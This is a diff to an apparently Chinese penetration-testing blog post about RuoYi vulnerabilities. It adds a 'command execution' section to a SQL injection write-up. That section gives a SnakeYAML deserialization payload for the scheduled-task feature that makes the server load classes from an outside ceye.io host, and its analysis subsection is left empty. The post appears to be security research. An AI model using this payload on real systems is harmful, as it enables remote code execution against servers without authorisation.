@@ -255,7 +255,16 @@
 <img src="/2022/06/20/ruoyi/2.png" class="" title="img">
 
 <p>可以看到这里通过切片增加了一个clearDataScope函数，将用户输入的值进行了清空，从而防止了sql注入。在xml文件中还是使用了<code>$&#123;&#125;</code>来拼接参数，这个参数从设计者的角度来说应该不是由用户控制的，而是由handleDataScope()函数来确定范围，只是由于设计问题导致用户可以控制这个字段从而导致了SQL注入。有一说一的话，如果不是开源项目的话，这个漏洞应该很难被发现。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>渗透测试还是需要对代码审计有学习的，很多的深层逻辑漏洞往往需要代码审计才能最终发现。</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="漏洞点一"><a href="#漏洞点一" class="headerlink" title="漏洞点一"></a>漏洞点一</h2><p>版本号要求 &lt;&#x3D; v4.6.2</p>
+<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>在系统的定时任务处，执行如下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://q8hf9w.ceye.io/&quot;]]]]&#x27;)</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/20/ruoyi/4.png" class="" title="img">
+
+<p>登录ceye，可以看到确实收到了请求，说明此处确实存在漏洞</p>
+<img src="/2022/06/20/ruoyi/5.png" class="" title="img">
+
+<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>渗透测试还是需要对代码审计有学习的，很多的深层逻辑漏洞往往需要代码审计才能最终发现。</p>
 
         </div>
 
